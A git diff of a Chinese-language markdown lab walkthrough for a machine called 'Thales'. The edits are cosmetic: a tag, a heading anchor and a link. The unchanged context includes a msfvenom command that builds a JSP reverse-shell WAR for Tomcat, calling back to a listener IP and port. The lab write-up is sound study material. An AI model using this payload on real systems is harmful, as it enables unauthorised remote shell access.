@@ -3,7 +3,6 @@ title: "Thales"
 date: 2026-04-07
 draft: false
 weight: 1
-tech_tags: ["反弹shell"]
 ---
 
 # 一、侦测
@@ -65,14 +64,14 @@ exploit
 ```
 tomcat;role1
 
-## 2.2 反弹shell
+## 2.2 反弹shell {#apache-war-revshell}
 ![](images/1.png)
 
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.203.129 LPORT=7777 -f war -o revshell.war`
 
 ![](images/2.png)
 
-成功反弹shell，接着升级shell界面，见[kali linux基操 4.3 升级shell界面]({{< relref "/docs/cybersecurity/kali_linux基操/index.md#43-升级shell界面" >}})
+成功反弹shell，接着升级shell界面，见[kali linux中升级shell界面](/docs/cybersecurity/kali_linux基操/index.md#update-shell)
 
 ## 2.3 shell中获取信息（难）
 sudo权限分析：`sudo -l`，但密码不对，因此不用这个思路
